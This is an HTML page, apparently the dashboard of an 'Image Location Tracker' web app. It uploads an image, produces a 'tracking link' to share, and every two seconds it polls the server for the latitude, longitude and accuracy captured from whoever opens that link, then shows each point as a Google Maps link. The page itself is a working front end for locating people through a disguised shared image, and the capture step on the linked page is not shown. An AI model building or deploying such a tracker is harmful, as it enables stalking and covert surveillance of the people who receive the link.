<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üìç Image Viewer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7338115467128409"
     crossorigin="anonymous"></script>
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-4VJMMCE3WR"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4VJMMCE3WR');
</script>
  <style>
    :root {
      --primary: #0077cc;
      --bg: #f4f6f8;
      --card-bg: #fff;
      --text: #333;
      --border: #e0e0e0;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, sans-serif;
      background: var(--bg);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    header {
      background: var(--primary);
      color: white;
      padding: 15px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    header h1 {
      font-size: 1.4rem;
      margin: 0;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    header h1::before {
      content: "üìå";
    }

    header nav a {
      color: white;
      margin-left: 15px;
      text-decoration: none;
      font-weight: 500;
      transition: opacity 0.3s;
    }

    header nav a:hover {
      opacity: 0.8;
    }

    main {
      flex: 1;
      display: flex;
      justify-content: center;
      padding: 30px 20px;
    }

    .container {
      background: var(--card-bg);
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
      max-width: 650px;
      width: 100%;
      transition: transform 0.3s;
    }

    .container:hover {
      transform: translateY(-3px);
    }

    input[type="file"] {
      width: 100%;
      padding: 10px;
      border: 2px dashed #ccc;
      border-radius: 8px;
      background: #fafafa;
      cursor: pointer;
      transition: border-color 0.3s;
    }

    input[type="file"]:hover {
      border-color: var(--primary);
    }

    .link-box {
      background: #f8f9fa;
      border: 1px solid #ddd;
      padding: 12px;
      border-radius: 8px;
      margin-top: 15px;
      display: none;
      word-break: break-all;
    }

    .link-box a {
      color: var(--primary);
      text-decoration: none;
      font-weight: bold;
    }

    .link-box a:hover {
      text-decoration: underline;
    }

    hr {
      margin: 25px 0;
      border: none;
      height: 1px;
      background: #eee;
    }

    h2 {
      font-size: 1.3rem;
      display: flex;
      align-items: center;
      gap: 6px;
      margin-bottom: 10px;
    }

    h2::before {
      content: "üìç";
    }

    ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }

    li {
      background: #f9fafb;
      padding: 12px;
      border: 1px solid var(--border);
      border-radius: 8px;
      margin-bottom: 8px;
      transition: background 0.3s;
    }

    li:hover {
      background: #eef6ff;
    }

    li a {
      color: var(--primary);
      text-decoration: none;
      font-weight: 500;
    }

    li a:hover {
      text-decoration: underline;
    }

    .empty {
      text-align: center;
      color: #777;
      font-style: italic;
      background: #f4f4f4;
      padding: 10px;
      border-radius: 8px;
    }

    footer {
      background: #fafafa;
      border-top: 1px solid #ddd;
      text-align: center;
      padding: 15px;
      font-size: 0.9rem;
      color: #555;
    }

    footer a {
      color: var(--primary);
      text-decoration: none;
    }

    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <header>
    <h1>Image Location Tracker</h1>
    <nav>
      <a href="#">Home</a>
      <a href="static/about.html">About</a> 
<a href="static/contact.html">Contact</a> 
<a href="static/privacy.html">Privacy Policy</a>
    </nav>
  </header>

  <main>
    <div class="container">
      <!-- File Upload -->
      <input id="fileInput" type="file" name="file" required>

      <!-- Tracking Link -->
      <div id="link-box" class="link-box">
        <p>‚úÖ Share this tracking link:</p>
        <a id="tracking-link" href="#" target="_blank"></a>
      </div>

      <hr>

      <!-- Locations Section -->
      <h2>Captured Locations</h2>
      <ul id="locations"></ul>
    </div>
  </main>

  <footer>
    ¬© 2025 Image Location Tracker. Made by jagdishprajapati572@gmail.com ‚ù§Ô∏è for secure tracking.
    | <a href="#">Privacy Policy</a>
  </footer>

  <script>
    let currentImageId = null;

    // Handle file upload and generate link
    document.getElementById('fileInput').addEventListener('change', async (e) => {
      const file = e.target.files[0];
      if (!file) return;

      const formData = new FormData();
      formData.append('file', file);

      const res = await fetch('/upload', { method: 'POST', body: formData });
      const data = await res.json();

      if (data.ok) {
        currentImageId = data.image_id;

        const linkBox = document.getElementById('link-box');
        const trackingLink = document.getElementById('tracking-link');
        const link = `${window.location.origin}/i/${currentImageId}`;
        trackingLink.href = link;
        trackingLink.textContent = link;
        linkBox.style.display = 'block';
      } else {
        alert('‚ùå Upload failed');
      }
    });

    // Fetch the last location for the current image
    async function fetchLocations() {
  if (!currentImageId) return;

  const res = await fetch(`/logs/last/${currentImageId}`);
  const data = await res.json();
  const list = document.getElementById('locations');
  list.innerHTML = '';

  if (!data || data.error) {
    list.innerHTML = '<div class="empty">No location reports yet.</div>';
    return;
  }

  // üî∏ Use top-level lat/lon instead of data.payload
  const p = data;
  if (p.lat && p.lon) {
    const mapUrl = `https://www.google.com/maps?q=${p.lat},${p.lon}`;
    const li = document.createElement('li');
    li.innerHTML = `
      <b>${p.received_at || new Date().toISOString()}</b><br>
      <a href="${mapUrl}" target="_blank">Open in Google Maps</a><br>
      Accuracy: ${Math.round(p.accuracy)} m
    `;
    list.appendChild(li);
  } else {
    list.innerHTML = '<div class="empty">No valid coordinates found.</div>';
  }
}

    setInterval(fetchLocations, 2000);
  </script>
</body>
</html>
